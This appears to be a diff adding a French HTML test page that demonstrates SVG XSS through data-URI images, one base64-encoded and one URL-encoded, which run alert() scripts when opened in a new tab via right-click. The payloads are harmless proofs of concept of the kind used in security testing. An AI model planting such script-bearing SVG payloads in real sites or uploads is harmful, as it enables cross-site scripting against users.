@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>SVG XSS — Test clic droit</title>
+  <style>
+    body {
+      font-family: monospace;
+      max-width: 800px;
+      margin: 40px auto;
+      padding: 20px;
+      background: #0f172a;
+      color: #e2e8f0;
+    }
+    h1 { color: #3B82F6; }
+    .test-zone {
+      border: 2px dashed #3B82F6;
+      padding: 30px;
+      border-radius: 8px;
+      text-align: center;
+      margin: 20px 0;
+    }
+    code {
+      background: #1e293b;
+      padding: 2px 6px;
+      border-radius: 4px;
+      color: #93c5fd;
+    }
+    .note {
+      background: #1e293b;
+      padding: 15px;
+      border-radius: 6px;
+      border-left: 4px solid #3B82F6;
+      margin: 15px 0;
+    }
+    .note.warning {
+      border-left-color: #f59e0b;
+    }
+  </style>
+</head>
+<body>
+  <h1>SVG XSS — Test clic droit</h1>
+  
+  <div class="note">
+    <strong>Mécanisme :</strong> Le SVG embarqué dans <code>&lt;img&gt;</code> via data URI est 
+    sandboxé à l'affichage. Mais si tu fais clic droit → "Ouvrir l'image dans un nouvel onglet",
+    le navigateur <em>navigue</em> vers la data URI directement — le SVG devient un document 
+    à part entière avec scripting actif.
+  </div>
+
+  <div class="note warning">
+    <strong>Attendu (navigateurs modernes) :</strong> opaque origin → alert s'exécute mais 
+    sans accès au document parent. Sur anciens navigateurs : XSS complète.
+  </div>
+
+  <div class="test-zone">
+    <p>↓ FAIRE CLIC DROIT SUR L'IMAGE ↓</p>
+    <p>"Ouvrir l'image dans un nouvel onglet" / "Open image in new tab"</p>
+    <br>
+    <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIAogICAgIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIgogICAgIHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIgogICAgIG9ubG9hZD0iYWxlcnQoJ1hTUyDigJQgU1ZHIG9ubG9hZCAoY2xpYyBkcm9pdCDihpIgb3V2cmlyIGRhbnMgbm91dmVsIG9uZ2xldCknKSI+CiAgPHNjcmlwdD4KICAgIC8vIEZhbGxiYWNrIHNpIG9ubG9hZCBuZSBkw6ljbGVuY2hlIHBhcwogICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGZ1bmN0aW9uKCkgewogICAgICBhbGVydCgnWFNTIOKAlCBET01Db250ZW50TG9hZGVkIGRhbnMgU1ZHJyk7CiAgICB9KTsKICA8L3NjcmlwdD4KICA8cmVjdCB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgZmlsbD0iIzNCODJGNiIgcng9IjEwIi8+CiAgPHRleHQgeD0iMTAwIiB5PSIxMDUiIAogICAgICAgIHRleHQtYW5jaG9yPSJtaWRkbGUiIAogICAgICAgIGZpbGw9IndoaXRlIiAKICAgICAgICBmb250LWZhbWlseT0ibW9ub3NwYWNlIiAKICAgICAgICBmb250LXNpemU9IjE0Ij4KICAgIENMSUMgRFJPSVQg4oaSIE9VVlJJUgogIDwvdGV4dD4KICA8dGV4dCB4PSIxMDAiIHk9IjEyNSIgCiAgICAgICAgdGV4dC1hbmNob3I9Im1pZGRsZSIgCiAgICAgICAgZmlsbD0id2hpdGUiIAogICAgICAgIGZvbnQtZmFtaWx5PSJtb25vc3BhY2UiIAogICAgICAgIGZvbnQtc2l6ZT0iMTEiPgogICAgZGFucyB1biBub3V2ZWwgb25nbGV0CiAgPC90ZXh0Pgo8L3N2Zz4=" width="200" height="200" alt="SVG test">
+    <br><br>
+    <small>L'image doit afficher un carré bleu avec du texte.</small>
+  </div>
+
+  <div class="note">
+    <strong>Vecteur :</strong><br>
+    <code>data:image/svg+xml;base64,...</code><br>
+    <br>
+    <strong>SVG contient :</strong><br>
+    • <code>onload="alert(...)"</code> sur &lt;svg&gt;<br>
+    • <code>&lt;script&gt;DOMContentLoaded...</code> en fallback
+  </div>
+
+  <h2>Version sans base64 (data URI inline)</h2>
+  <div class="note">
+    Variante avec encodage URL — même vecteur :
+  </div>
+  <div class="test-zone">
+    <p>↓ CLIC DROIT → NOUVEL ONGLET ↓</p>
+    <br>
+    <img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22alert('XSS%20-%20URL%20encoded%20SVG')%22%20width%3D%22200%22%20height%3D%22200%22%3E%3Crect%20width%3D%22200%22%20height%3D%22200%22%20fill%3D%22%23059669%22%20rx%3D%2210%22%2F%3E%3Ctext%20x%3D%22100%22%20y%3D%22110%22%20text-anchor%3D%22middle%22%20fill%3D%22white%22%20font-family%3D%22monospace%22%20font-size%3D%2213%22%3EURL-encoded%20SVG%3C%2Ftext%3E%3C%2Fsvg%3E" width="200" height="200" alt="URL-encoded SVG">
+    <br><br>
+    <small>Carré vert. Même comportement attendu.</small>
+  </div>
+
+</body>
+</html>
